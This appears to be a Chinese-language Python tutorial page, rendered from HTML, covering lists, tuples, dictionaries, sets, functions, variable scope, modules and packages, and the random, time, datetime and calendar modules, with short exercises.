<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列表类型</span></span><br><span class="line">list0 = [<span class="string">&quot;开群&quot;</span>,<span class="string">&quot;老谢&quot;</span>,<span class="string">&quot;嘉豪&quot;</span>,<span class="number">10</span>,<span class="literal">True</span>,[<span class="number">12</span>,<span class="number">34</span>],(<span class="number">56</span>,<span class="number">78</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表中元素的个数  len</span></span><br><span class="line">res = <span class="built_in">len</span>(list0)</span><br><span class="line"><span class="built_in">print</span>(res) <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问列表中元素</span></span><br><span class="line"><span class="comment"># [0,len(list0)-1]    [-len(list0),-1]</span></span><br><span class="line">res = list0[<span class="number">1</span>] <span class="comment"># 7IndexError: list index out of range</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改元素</span></span><br><span class="line">list0[<span class="number">0</span>] = <span class="string">&quot;老杨&quot;</span></span><br><span class="line"><span class="built_in">print</span>(list0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向列表中添加元素</span></span><br><span class="line">list0.append(<span class="string">&quot;思思&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(list0)</span><br><span class="line"></span><br><span class="line">list0.append(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(list0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在指定位置插入元素  下标0</span></span><br><span class="line">list0.insert(<span class="number">0</span>,<span class="string">&quot;head&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(list0)</span><br><span class="line"></span><br><span class="line">list0.insert(<span class="number">1</span>,<span class="string">&quot;body&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(list0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将一个列表合并到当前列表中</span></span><br><span class="line">list1 = [<span class="number">99</span>,<span class="number">88</span>,<span class="number">77</span>,<span class="number">55</span>,<span class="number">66</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">10</span>,<span class="number">22</span>,<span class="number">10</span>]</span><br><span class="line">list0.extend(list1)</span><br><span class="line"><span class="built_in">print</span>(list0)</span><br><span class="line"><span class="comment"># list0.append(list1) # 追加 和 合并是有区别的</span></span><br><span class="line"><span class="comment"># print(list0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除元素</span></span><br><span class="line"><span class="comment"># 直接删除最后一个元素</span></span><br><span class="line">list0.pop()</span><br><span class="line"><span class="built_in">print</span>(list0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定索引位置的元素</span></span><br><span class="line">list0.pop(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(list0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的元素</span></span><br><span class="line">list0.remove(<span class="number">10</span>) <span class="comment"># 如果有重复元素 只会删除第一个次出现的元素</span></span><br><span class="line"><span class="built_in">print</span>(list0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计某个元素出现的次数  传入一元素</span></span><br><span class="line">res = list0.count(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">list0 = [10,22,44,66,22,10,99,66]</span></span><br><span class="line"><span class="string">要求;列表中元素顺序不变  使每个一个元素只有一个</span></span><br><span class="line"><span class="string">最后的结果：[10,22,44,66,99]</span></span><br><span class="line"><span class="string">提示思路： </span></span><br><span class="line"><span class="string">1.可以借助其他列表辅助完成存储</span></span><br><span class="line"><span class="string">2.使用到成员运算符  in 或 not in</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># list0 = [10,22,44,66,22,10,99,66]</span></span><br><span class="line"><span class="comment"># list1 = []</span></span><br><span class="line"><span class="comment"># for item in list0:</span></span><br><span class="line"><span class="comment">#     if item not in list1:</span></span><br><span class="line"><span class="comment">#         list1.append(item)</span></span><br><span class="line"><span class="comment"># print(list1)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">set 用于排重的  是一个无序的集合【插入顺序和显示顺序不一致】</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># res = set(list0)</span></span><br><span class="line"><span class="comment"># print(list(res))  # [66, 99, 10, 44, 22]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表 可以切片吗？  [start:stop:step]</span></span><br><span class="line"><span class="built_in">print</span>(list0)</span><br><span class="line"><span class="comment"># 从头到尾提取数据</span></span><br><span class="line">sub_list = list0[::]</span><br><span class="line"><span class="built_in">print</span>(sub_list)</span><br><span class="line"></span><br><span class="line">sub_list = list0[<span class="number">1</span>::]</span><br><span class="line"><span class="built_in">print</span>(sub_list)</span><br><span class="line"><span class="comment"># 倒序</span></span><br><span class="line">sub_list = list0[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(sub_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法 倒序</span></span><br><span class="line">list0.reverse()</span><br><span class="line"><span class="built_in">print</span>(list0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 排序:同类型的数据 才会有排序的情况出现</span></span><br><span class="line">list0 = [<span class="number">12</span>,<span class="number">22</span>,<span class="number">55</span>,<span class="number">35</span>,<span class="number">19</span>,<span class="number">66</span>,<span class="number">48</span>,<span class="number">88</span>]</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">sort(key=None, reverse=False)</span></span><br><span class="line"><span class="string">key: 接受的一个函数</span></span><br><span class="line"><span class="string">     函数可以当做值进行传递</span></span><br><span class="line"><span class="string">     key的作用：将列表中的元素依次作用于对应的函数 返回排序的元素状态 默认数据大小进行排序的</span></span><br><span class="line"><span class="string">reverse： 接受的是布尔值</span></span><br><span class="line"><span class="string">        控制排序完之后是升序还是降序</span></span><br><span class="line"><span class="string">        默认升序 值False</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">list0.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(list0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取列表中最大值</span></span><br><span class="line">list0 = [<span class="number">12</span>,<span class="number">22</span>,<span class="number">55</span>,<span class="number">35</span>,<span class="number">19</span>,<span class="number">66</span>,<span class="number">48</span>,<span class="number">88</span>]</span><br><span class="line">max_value = <span class="built_in">max</span>(list0)</span><br><span class="line"><span class="built_in">print</span>(max_value)</span><br><span class="line"></span><br><span class="line">list0 = [<span class="number">12</span>,<span class="number">22</span>,<span class="number">55</span>,<span class="number">35</span>,<span class="number">19</span>,<span class="number">66</span>,<span class="number">48</span>,<span class="number">88</span>]</span><br><span class="line">min_value = <span class="built_in">min</span>(list0)</span><br><span class="line"><span class="built_in">print</span>(min_value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自己去写方法</span></span><br><span class="line">max_value = list0[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> list0:</span><br><span class="line">    <span class="keyword">if</span> item &gt; max_value:</span><br><span class="line">        max_value = item</span><br><span class="line"><span class="built_in">print</span>(max_value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 另外的方式去找最大值</span></span><br><span class="line">max_index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(list0)):</span><br><span class="line">    <span class="keyword">if</span> list0[i] &gt; list0[max_index]:</span><br><span class="line">        max_index = i</span><br><span class="line"><span class="built_in">print</span>(list0[max_index])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 二维列表</span></span><br><span class="line">list_two = [[<span class="number">89</span>,<span class="number">77</span>,<span class="number">62</span>],[<span class="number">44</span>,<span class="number">23</span>],[<span class="number">55</span>,<span class="number">66</span>,<span class="number">88</span>,<span class="number">22</span>]]</span><br><span class="line">res = list_two[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(res[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">res = list_two[<span class="number">2</span>][<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># 获取所有一维列表</span></span><br><span class="line"><span class="keyword">for</span> list1 <span class="keyword">in</span> list_two:</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> list1:</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line"><span class="comment"># 返回值与下标</span></span><br><span class="line">list_two = [<span class="number">89</span>,<span class="number">77</span>,<span class="number">62</span>,<span class="number">44</span>,<span class="number">23</span>,<span class="number">55</span>,<span class="number">66</span>,<span class="number">88</span>,<span class="number">22</span>]</span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span>  <span class="built_in">enumerate</span>(list_two):</span><br><span class="line">    <span class="built_in">print</span>(k,v) </span><br><span class="line">      <span class="number">0</span> <span class="number">89</span></span><br><span class="line">      <span class="number">1</span> <span class="number">77</span> </span><br><span class="line">   	。。。。</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-元组类型"><a href="#4-元组类型" class="headerlink" title="4.元组类型"></a>4.元组类型</h3><p>类似于列表的 与列表的区别：</p>
<p>列表对应的元素的值是可以发生修改的</p>
<p>元组的元素值是不可以发生修改的</p>
<p>简单的说;元组一旦确定 内容不能发生改变</p>
<p>没有对应的增加 删除 和 修改</p>
<p>遍历的操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 元组类型 ()  tuple</span></span><br><span class="line">tuple0 = (<span class="number">23</span>,<span class="number">56</span>,<span class="number">99</span>,<span class="literal">True</span>,<span class="string">&quot;abc&quot;</span>)</span><br><span class="line"><span class="comment"># 获取元组中的数据 通过索引获取</span></span><br><span class="line">value = tuple0[-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取元组的元素个数</span></span><br><span class="line">num =  <span class="built_in">len</span>(tuple0)</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改元组元素  TypeError: &#x27;tuple&#x27; object does not support item assignment 不可以修改</span></span><br><span class="line"><span class="comment"># tuple0[0] = 32</span></span><br><span class="line"><span class="comment"># print(tuple0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取的操作</span></span><br><span class="line">tuple1 = ([<span class="number">12</span>,<span class="number">56</span>],<span class="string">&quot;abc&quot;</span>,<span class="number">88</span>)</span><br><span class="line"><span class="comment"># 获取12</span></span><br><span class="line"><span class="built_in">print</span>(tuple1[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">tuple1[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">22</span></span><br><span class="line"><span class="built_in">print</span>(tuple1)</span><br><span class="line"><span class="comment"># 元组中的列表 列表是可以修改的</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tuple1[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tuple1[<span class="number">1</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tuple1[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">tuple1[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">22</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tuple1[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tuple1[<span class="number">1</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tuple1[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> tuple1:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tuple1)):</span><br><span class="line">    <span class="built_in">print</span>(tuple1[i])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 小括号 还有另外一层意思 就是提高运算的优先级</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>((<span class="number">10</span>,)))</span><br></pre></td></tr></table></figure>

<h3 id="5-字典-dict"><a href="#5-字典-dict" class="headerlink" title="5.字典 dict"></a>5.字典 dict</h3><p>{}  使用键值对的形式来存储数据的</p>
<p>存放键值对的集合 元素也是无序的</p>
<p>存放的顺序 可能和显示顺序是不一致的 但是一旦确定位置一直在对应位置显示</p>
<p>键和值是一一对应的</p>
<p>在字典中是根据键来查找值的</p>
<p>注：对于键的要求</p>
<p>1.不能重复 必须是唯一的</p>
<p>2.键的类型对应的数据是不可以改变的【值是元素内容】</p>
<p>一旦键发生变化 — 找不到原的内容</p>
<p>一般采用 字符串（常用） 或 整型</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字典操作</span></span><br><span class="line">dict0 = &#123;<span class="string">&quot;语文&quot;</span>:<span class="number">100</span>,<span class="string">&quot;数学&quot;</span>:<span class="number">150</span>,<span class="string">&quot;英语&quot;</span>:<span class="number">60</span>&#125;</span><br><span class="line">res = <span class="string">&quot;语文&quot;</span> <span class="keyword">in</span> dict0</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.在字典中添加键值对</span></span><br><span class="line">dict0[<span class="string">&quot;政治&quot;</span>] = <span class="number">77</span></span><br><span class="line"><span class="built_in">print</span>(dict0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取值   根据键获取值</span></span><br><span class="line">value = dict0[<span class="string">&quot;语文&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># KeyError: &#x27;历史&#x27;  报错  不建议</span></span><br><span class="line"><span class="comment"># value = dict0[&quot;历史&quot;]</span></span><br><span class="line"><span class="comment"># print(value)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 建议使用 get方式去获取值</span></span><br><span class="line">value  = dict0.get(<span class="string">&quot;历史&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(value) <span class="comment"># None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 修改 值</span></span><br><span class="line">dict0[<span class="string">&quot;语文&quot;</span>] = <span class="number">88</span></span><br><span class="line"><span class="built_in">print</span>(dict0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 删除</span></span><br><span class="line">dict0.pop(<span class="string">&quot;政治&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(dict0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.对于字典进行遍历</span></span><br><span class="line"><span class="comment"># 5.1 只遍历key 键</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dict0:</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line"><span class="comment"># 5.2 只遍历value 值</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> dict0.values():</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line"><span class="comment"># 5.3 获取所有的键值对元素</span></span><br><span class="line"><span class="comment"># items = dict0.items()</span></span><br><span class="line"><span class="comment"># print(items) # [(&#x27;语文&#x27;, 88), (&#x27;数学&#x27;, 150), (&#x27;英语&#x27;, 60)]</span></span><br><span class="line"><span class="comment"># for item in items:</span></span><br><span class="line"><span class="comment">#     print(&quot;key=&quot;,item[0],&quot;value=&quot;,item[1])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a,b = (11,12)</span></span><br><span class="line"><span class="comment"># print(a,b)</span></span><br><span class="line"><span class="comment"># 同时获取键和值</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> dict0.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;key=&quot;</span>,k,<span class="string">&quot;value=&quot;</span>,v)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">练习1：</span></span><br><span class="line"><span class="string">统计一个英文字符串中 每个字母出现的次数</span></span><br><span class="line"><span class="string">要求使用字典存储：</span></span><br><span class="line"><span class="string">key:value</span></span><br><span class="line"><span class="string">字母:个数</span></span><br><span class="line"><span class="string">例子：aaabbbccca</span></span><br><span class="line"><span class="string">&#123;&#x27;a&#x27;:4,&#x27;b&#x27;:3,&#x27;c&#x27;:3&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># # 提示用户输入字符串</span></span><br><span class="line"><span class="comment"># src_str = input(&quot;请输入一个英文字符串:&quot;)</span></span><br><span class="line"><span class="comment"># # 定义容器存储数据 字典</span></span><br><span class="line"><span class="comment"># dict_str = &#123;&#125;</span></span><br><span class="line"><span class="comment"># # 遍历所有输入的字符串</span></span><br><span class="line"><span class="comment"># for s in src_str:</span></span><br><span class="line"><span class="comment">#     if s not in dict_str:</span></span><br><span class="line"><span class="comment">#         dict_str[s] = 1</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         # 获取value</span></span><br><span class="line"><span class="comment">#         value = dict_str[s]</span></span><br><span class="line"><span class="comment">#         value += 1</span></span><br><span class="line"><span class="comment">#         dict_str[s] = value</span></span><br><span class="line"><span class="comment"># print(dict_str)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">练习2：</span></span><br><span class="line"><span class="string">键盘录入一句英文语句 单词和单词之间用空格隔开 统计每个单词出现的次数</span></span><br><span class="line"><span class="string">要求使用字典存储：</span></span><br><span class="line"><span class="string">key:value</span></span><br><span class="line"><span class="string">字母:个数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">abc abc ddd hello hello</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提示用户输入英文语句</span></span><br><span class="line">words = <span class="built_in">input</span>(<span class="string">&quot;请录入一句英文语句，单词和单词之间用空格隔开:&quot;</span>)</span><br><span class="line">w_dict = &#123;&#125;</span><br><span class="line"><span class="comment"># 根据空格切割字符串</span></span><br><span class="line">w_list = words.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="comment"># 遍历列表</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> w_list:</span><br><span class="line">    <span class="keyword">if</span> word <span class="keyword">not</span> <span class="keyword">in</span> w_dict:</span><br><span class="line">        w_dict[word] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        w_dict[word] += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(w_dict)</span><br></pre></td></tr></table></figure>

<h3 id="6-集合"><a href="#6-集合" class="headerlink" title="6.集合"></a>6.集合</h3><p>不允许存放重复的数据 会有自动排重的效果</p>
<p>简单说:用于排重的操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 集合 setdict0 = &#123;&quot;语文&quot;:100,&quot;数学&quot;:150,&quot;英语&quot;:60,&quot;英语&quot;:60&#125;set0 = set([1,2,3,1,2,3])print(set0)# 交集 &amp; 和 并集 |set1 = &#123;1,2,3&#125;set2 = &#123;2,3,4&#125;print(set1&amp;set2) # 2 3print(set1|set2) # 1 2 3 4</span></span><br></pre></td></tr></table></figure>

<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="1-函数的概述"><a href="#1-函数的概述" class="headerlink" title="1.函数的概述"></a>1.函数的概述</h3><p>为什么要使用函数？？？</p>
<p>函数就是对功能的封装</p>
<p>例子：求圆的面积？</p>
<h5 id="S-π-r-2"><a href="#S-π-r-2" class="headerlink" title="S =  π*r**2"></a>S =  π*r**2</h5><p>求半径为10的圆的面积</p>
<p>3.14*10**2</p>
<p>求半径为9的圆的面积</p>
<p>3.14*9**2</p>
<p>…..</p>
<p>工程效率比较低</p>
<p>函数作用：对功能进行封装 增强代码的复用性 提高程序效率</p>
<h3 id="2-函数的分类"><a href="#2-函数的分类" class="headerlink" title="2.函数的分类"></a>2.函数的分类</h3><p>内置函数  和 自定义函数</p>
<p>内置函数： 系统提供的现成的函数  直接可以使用</p>
<p>例如：print()  int() type() input()….</p>
<p>自定义函数：</p>
<p>函数的定义格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> 函数名(<span class="params">变量<span class="number">1</span>,变量<span class="number">2.</span>..变量n</span>):</span>	函数功能的实现	<span class="keyword">return</span> 功能的结果<span class="function"><span class="keyword">def</span> --- 声明函数的关键字函数名 --- 功能名字  方便之后通过名字进行调用		  命名规范：符合标识符规范 函数名英文字母都是小写 每个单词之间使用下划线隔开  <span class="title">circle_area</span> (<span class="params">起名 最好做到见名知意</span>)小括号 --- 形参列表		  形参： 作用于存储函数功能中未知项的值            实参： 为形参赋值的数据  <span class="title">return</span> --- 作用：结束函数 并将功能的结果返回给调用者  		   如果该功能的实现不必须要返回结果 <span class="title">return</span>可以省略 或者写成 <span class="title">return</span> <span class="title">None</span>    </span></span><br></pre></td></tr></table></figure>

<h3 id="3-函数实战"><a href="#3-函数实战" class="headerlink" title="3.函数实战"></a>3.函数实战</h3><p>1.封装功能</p>
<p>根据两个明确来完成函数的声明：</p>
<p>a：明确是否有未知项参与函数功能的运算   — 形参的列表  有几个未知项就声明几个变量</p>
<p>b：明确调用者是否需要接受结果  – 决定是return</p>
<p>封装计算圆的面积功能？</p>
<p>S =  π*r**2</p>
<p>未知项 ： 1个   r</p>
<p>返回结果： 需要return</p>
<h3 id="4-作用域的问题"><a href="#4-作用域的问题" class="headerlink" title="4.作用域的问题"></a>4.作用域的问题</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 封装一个修改名字的功能name = &quot;开群&quot; # 全局变量def change_name():    &quot;&quot;&quot;    在函数内部可以直接获取外部变量的数据    如果要进行修改    变量名 = 值    变量作用域的问题：如果直接在函数内部内容写为  变量名 = 值 解释器会默认为函数内部的变量 与外部变量无关    如果想修改外部变量的值 在函数内部标注该变量的作用域范围 global 使用全局变量    &quot;&quot;&quot;    global name    name = &quot;小杨&quot; # 局部变量    print(&quot;函数内部&quot;,name)change_name()print(&quot;外部&quot;,name)</span></span><br></pre></td></tr></table></figure>

<h3 id="5-默认参数"><a href="#5-默认参数" class="headerlink" title="5.默认参数"></a>5.默认参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(self, *args, sep=<span class="string">&#x27; &#x27;</span>, end=<span class="string">&#x27;\n&#x27;</span>, file=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<p>声明了一个形参  并给他赋予初始值</p>
<p>调用函数的时候 如果没有给这个形参赋值 这个参数有默认值 使用默认值参与函数功能的运算</p>
<p>例子:求x的y次方？</p>
<h2 id="模块和包"><a href="#模块和包" class="headerlink" title="模块和包"></a>模块和包</h2><p>后面要预习的内容：</p>
<p>高阶函数（内置函数）</p>
<p>map 、reduce、filter</p>
<p>常用的模块</p>
<p>time、datetime、calender、os</p>
<h3 id="一-模块和包"><a href="#一-模块和包" class="headerlink" title="一.模块和包"></a>一.模块和包</h3><p>模块就是一个工具包  一个py文件称之为一个模块</p>
<p>有三种模块类型</p>
<p>1.python系统提供的模块</p>
<p>如:random  time  math…</p>
<p>2.第三方模块</p>
<p>别人写好的  自己拿来使用</p>
<p>需要安装模块工具   pip</p>
<p>控制台命令 输入：pip install 模块名  </p>
<p>conda install 模块名</p>
<p> 注：必须要有网络</p>
<p>3.自定义模块</p>
<p>如果要使用其他模块 – 导入模块   import</p>
<p>导入模块的方式：</p>
<p>a) import 模块的名字  </p>
<p>这种形式使用模块内容是 格式是 模块名.内容名</p>
<p>b） from 模块名  import 内容名称</p>
<p>c)  from 模块名  import  *</p>
<p><code>*</code>  通配符  泛指当前模块下所有的内容</p>
<p>使用之前要注意：调用的内容必须是在模块的<code>“__all__”</code> 字段中指明的内容</p>
<p>注：当导入的模块不容易记住 可以取个别名 as</p>
<p>格式：import 模块名 as 别名</p>
<p>在使用的时候只能通过别名来调用内容</p>
<p><code>__main__</code> 程序入口</p>
<p>启动程序是 从那个文件先进入 对应的那个文件称之为程序的入口文件 <code>这个文件中__name__</code> 对应的字段值就是 <code>__main__</code></p>
<h3 id="第三方模块的使用-–-安装-pip-install-模块名"><a href="#第三方模块的使用-–-安装-pip-install-模块名" class="headerlink" title="第三方模块的使用  – 安装  pip install 模块名"></a>第三方模块的使用  – 安装  pip install 模块名</h3><p>pymysql  </p>
<p>redis</p>
<p>pygame</p>
<h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>包的作用:为模块提供多层命名空间 并对其进行分配管理</p>
<p>常识问题：</p>
<p>在一个文件夹下 不允许同时存在两个名字相同的文件</p>
<p>a：</p>
<p>test.txt</p>
<p>b:</p>
<p>test.txt</p>
<p>在项目中不同的功能</p>
<p>起模块名的时候 – 很可能模块名重名就重名了</p>
<p>包就是程序中文件夹</p>
<p>包是必须在项目中才能存在的</p>
<p>包创建出来之后 会自带一个<code>&#39;__init__.py&#39;</code>文件  这个文件的作用就是标注该目录是一个包 而非普通文件夹</p>
<p>想使用包里面的模块的导入模式：</p>
<p>包名.模块名</p>
<p>有几层包 包名都用点分割 标注</p>
<h3 id="随机数模块"><a href="#随机数模块" class="headerlink" title="随机数模块"></a>随机数模块</h3><p>random</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> randomprint(random.random())  <span class="comment"># (0,1) float  大于0且小于1之间的小数print(random.randint(1,3)) #[1,3]  大于等于1小于等于3之间的整数print(random.randrange(1,3)) # [1,3) 大于等于1 小于3之间的整数print(random.choice([1,&quot;23&quot;,[4,5]])) # 在序列中随机产生一个内容print(random.sample([1,&quot;23&quot;,[4,5]],2)) # 列表中任意组合两个print(random.uniform(1,3)) # 大于1 小于3的小数item = [1,3,5,7,9]random.shuffle(item) # 打乱item的顺序 相当于 洗牌print(item)</span></span><br></pre></td></tr></table></figure>

<h3 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h3><p>时间模块: time datetime calender</p>
<p>时间戳：表示的是从1970年1月1日开始按秒计算的偏移量</p>
<p>a）.time</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time<span class="comment"># 获取当前的时间   -- 时间元组res = time.localtime()print(res)# 可以通过字段的方式获取 (推荐)year = res.tm_yearprint(year)# 通过索引获取# year = res[5]# print(year)# 2.获取当前时间对应时间戳seconeds =  time.time()print(seconeds)# 将时间戳转换时间元组time1 = time.localtime(seconeds)print(time1)# 休眠time.sleep(2)print(&quot;睡醒了&quot;)# 时间格式 2021年4月1日 9:54:22&#x27;&#x27;&#x27;表示年的占位符   %Y  2021  %y 21表示月的占位符   %m    日           %d  -- 表示是1-31号的日期                 %H  -- 24小时制                 %I  -- 12小时制                 %p  -- am/pm 的标识    分           %M    秒           %S    一年中的第几天     %j&#x27;&#x27;&#x27;t1 = time.localtime()# 将其进行格式化res = time.strftime(&quot;%Y/%m/%d %H:%M:%S %j %A&quot;,t1)print(res)# 将格式化的时间转换为时间元组 2021/04/01 10:00:01time_str = &quot;2021-04-01 10:00:01&quot;res = time.strptime(time_str,&quot;%Y-%m-%d %H:%M:%S&quot;)print(res)# 获取指定时间的秒数seconds = time.mktime(res)print(seconeds)&#x27;&#x27;&#x27;要求：获取指定时间的三天后的时间思路：指定一个时间  2020-01-01  --- 2020-01-04转成程序认识的时间 获取秒数+3天的秒数 ---时间戳&#x27;&#x27;&#x27;# 获取指定时间 的n天后/前的时间戳def get_time(time_str,days,format_str):    # 1.将时间转换为程序认识的时间元组    time_tuple = time.strptime(time_str,format_str)    # 2.获取指定时间的秒数    seconds = time.mktime(time_tuple)    # 3.获取days前/后时间戳    times = seconds + (days) * 24 * 3600    tiems_tuple = time.localtime(times)    res_times = time.strftime(format_str,tiems_tuple)    return res_timesres = get_time(&quot;2020-1-1&quot;,-3,&quot;%Y-%m-%d&quot;)print(res)</span></span><br></pre></td></tr></table></figure>

<p>b) datetime</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime<span class="comment"># 获取当前时间res = datetime.datetime.now()print(res)# 获取当前日期day = datetime.date.today()print(day)print(day.weekday()) # 星期# 获取指定时间 的n天后/前的时间res = datetime.date.today() - datetime.timedelta(days=-2) # 正数代表 过去  负数代表 未来   天数print(res)# 时间格式res = datetime.datetime.now().strftime(&quot;%Y-%m-%d %j&quot;)print(res)# 在转回去res = datetime.datetime.strptime(res,&quot;%Y-%m-%d %j&quot;)print(res)# 将时间转化为时间元组time_tuple = datetime.datetime.now().timetuple()print(time_tuple)</span></span><br></pre></td></tr></table></figure>

<p>c) calendar</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> calendar<span class="comment"># 显示指定年的日期res = calendar.calendar(2021)#print(res)res = calendar.month(2021,4)print(res)# 判断闰年和平年res = calendar.isleap(2021)print(res)res = calendar.monthcalendar(2021,1)print(res)day = res[2][2]print(day)res = calendar.weekday(2021,4,1)print(res) #[0,6] [星期1 星期天]# hashlib  加密模块</span></span><br></pre></td></tr></table></figure>

